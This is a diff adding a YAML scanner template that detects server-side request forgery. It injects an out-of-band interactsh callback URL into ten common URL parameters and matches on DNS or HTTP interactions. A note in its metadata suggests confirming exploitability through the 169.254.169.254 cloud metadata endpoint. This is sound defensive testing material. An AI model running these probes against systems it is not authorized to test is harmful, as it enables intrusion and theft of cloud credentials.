@@ -1,0 +1,46 @@
+id: ssrf-common-params
+
+info:
+  name: SSRF via Common URL Parameters (OOB)
+  author: chipo
+  severity: high
+  description: |
+    Probes commonly misused URL-carrying parameters for Server-Side Request Forgery.
+    Injects an interactsh OOB callback URL into parameters such as url, callback,
+    redirect, webhook, endpoint, dest, and fetch. A DNS or HTTP interaction on the
+    interactsh host confirms the server is making outbound requests with attacker-
+    controlled URLs, indicating SSRF.
+  reference:
+    - https://cwe.mitre.org/data/definitions/918.html
+    - https://portswigger.net/web-security/ssrf
+    - https://owasp.org/www-project-top-ten/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29
+  metadata:
+    false-positive: |
+      Legitimate redirect or webhook testing endpoints will trigger DNS hits.
+      Confirm exploitability by checking whether the interaction contains HTTP
+      response data from an internal endpoint (e.g., 169.254.169.254 metadata).
+    max-request: 10
+  tags: ssrf,oob,interactsh,owasp-a10
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url={{interactsh-url}}"
+      - "{{BaseURL}}/?callback={{interactsh-url}}"
+      - "{{BaseURL}}/?redirect={{interactsh-url}}"
+      - "{{BaseURL}}/?webhook={{interactsh-url}}"
+      - "{{BaseURL}}/?endpoint={{interactsh-url}}"
+      - "{{BaseURL}}/?dest={{interactsh-url}}"
+      - "{{BaseURL}}/?fetch={{interactsh-url}}"
+      - "{{BaseURL}}/?proxy={{interactsh-url}}"
+      - "{{BaseURL}}/?target={{interactsh-url}}"
+      - "{{BaseURL}}/?load={{interactsh-url}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
